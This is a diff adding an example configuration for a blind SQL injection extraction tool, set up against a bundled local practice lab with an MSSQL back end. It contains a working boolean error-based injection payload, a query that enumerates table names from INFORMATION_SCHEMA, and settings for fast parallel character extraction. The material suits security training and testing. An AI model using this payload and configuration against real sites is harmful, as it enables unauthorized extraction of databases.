@@ -1,0 +1,53 @@
+# Example configuration (requires PyYAML; JSON works without it).
+# These values match the bundled "Blind SQLi Lab" (MSSQL back end) at
+# http://localhost:3000/search. The prefix 'juniper' is a real username so the
+# injected row exists and the CASE predicate is actually evaluated.
+target_url: "http://localhost:3000/search"
+http_method: GET
+injection_param: q
+base_payload: "juniper' AND 1=(SELECT CASE WHEN ({condition}) THEN 1 ELSE 'a' END)-- "
+
+# Route every request through an intercepting proxy (Burp/ZAP) for inspection.
+# proxy: "http://127.0.0.1:8080"
+# proxy_insecure: true   # only if the proxy uses a self-signed TLS CA
+
+# Where the injected value goes: auto | form | json | raw.
+body_mode: auto
+# For body_mode=json, injection_param is a dotted key path into this body:
+#   http_method: POST
+#   body_mode: json
+#   injection_param: "creds.username"
+#   json_template: { "page": 1 }
+# For body_mode=raw, supply a template with {value} or {value_json}:
+#   body_mode: raw
+#   body_template: '{"q":"{value_json}","page":1}'
+#   content_type: application/json
+
+request_timeout: 10.0
+max_retries: 3
+retry_backoff: 0.25
+ambiguous_retries: 2
+
+workers: 10
+
+charset: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_$# ."
+max_length: 64
+strategy: adaptive        # adaptive | linear | binary
+discover_length: true
+predictor_order: 3
+char_batch: 3
+seq_batch: 3
+min_seq_prefix: 2
+
+target_name: TABLE_NAME
+target_expression: "(SELECT TOP(1) TABLE_NAME FROM INFORMATION_SCHEMA.TABLES ORDER BY TABLE_NAME)"
+dialect: mssql            # mssql | mysql | postgres
+
+classifier:
+  # Leave signatures empty to rely on auto-calibration (1=1 vs 1=2 probes).
+  error_body_signatures:
+    - "Conversion failed when converting"
+  auto_calibrate: true
+
+verbosity: 1
+output_file: exfil_result.json
